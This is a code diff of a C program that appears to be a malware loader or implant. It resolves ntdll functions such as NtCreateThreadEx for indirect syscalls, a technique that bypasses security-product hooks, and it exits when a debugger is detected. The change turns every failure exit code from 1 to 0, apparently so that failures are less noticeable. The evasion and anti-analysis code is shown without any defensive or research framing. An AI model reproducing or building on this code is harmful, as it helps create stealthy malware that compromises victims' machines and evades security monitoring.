@@ -35,20 +35,20 @@ VOID IndirectPrelude(HMODULE NtdllHandle, char NtFunctionName[], PDWORD NtFuncti
     
     NtFunctionAddress = getAddr(NtdllHandle, NtFunctionName);
     if (NtFunctionAddress == 0) {
-        exit(1);
+        exit(0);
     }
 
     *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
     *NtFunctionSyscall = NtFunctionAddress + 0x12;
 
     if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) != 0) {
-        exit(1);
+        exit(0);
     }
 }
 
 void isDebuggerModeOn() {
     if (_checkDebugger() != 0) {
-        exit(1);
+        exit(0);
     }
 }
 
@@ -102,7 +102,7 @@ int main() {
 
     NtdllHandle = getModuleHandle();
     if (NtdllHandle == NULL) {
-        exit(1);
+        exit(0);
     } 
 
     IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
@@ -118,12 +118,12 @@ int main() {
 
     result = malloc(sizeof(char) * 3000);
     if (result == NULL) {
-        exit(1);
+        exit(0);
     }
 
     userId = malloc(sizeof(char) * 37);
     if (userId == NULL) { 
-        exit(1);
+        exit(0);
     }
 
     LPBYTE tempUserId = getOrCreateAndGetUserId();
@@ -156,7 +156,7 @@ CLEANUP:
     }
 
     if (State) {
-        exit(1);
+        exit(0);
     }
 
     return 0;
